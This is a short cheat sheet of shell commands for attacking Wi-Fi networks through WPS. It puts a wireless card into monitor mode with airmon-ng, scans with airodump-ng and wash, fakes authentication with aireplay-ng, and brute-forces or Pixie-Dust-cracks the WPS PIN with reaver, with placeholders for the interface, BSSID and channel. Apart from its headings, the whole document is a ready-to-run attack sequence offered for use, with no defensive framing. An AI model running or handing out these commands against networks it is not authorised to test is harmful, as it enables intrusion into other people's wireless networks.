
Wireless Attack            
		                        
using the below tools      
 			                    
-----wash(or airodump-ng) 
-----reaver		    

-==[SimpleAttackWay]==-

	sudo airmon-ng check kill

	sudo airmon-ng start <inter_face>

	sudo airodump-ng <inter_face>

	sudo wash -i <inter_face> 

	sudo reaver -i <inter_face> 

	sudo aireplay-ng --fakeauth 30 -a <BSSID> -h <MAC_ID> <inter_face>

	sudo reaver -i <inter_face> -b <BSSID> -c <Channels> -f -a -w -vv --no-associate

		or 

	sudo reaver -i <inter_face> -b <BSSID> -c <Channels> -d 30 -S -N -vv --no-associate

-==[PixiDustAttack]==-

	sudo reaver -i <inter_face> -b <BSSID> -K 
	
	sudo reaver -i <inter_face> -b <BSSID> -p <PIN_KEY>
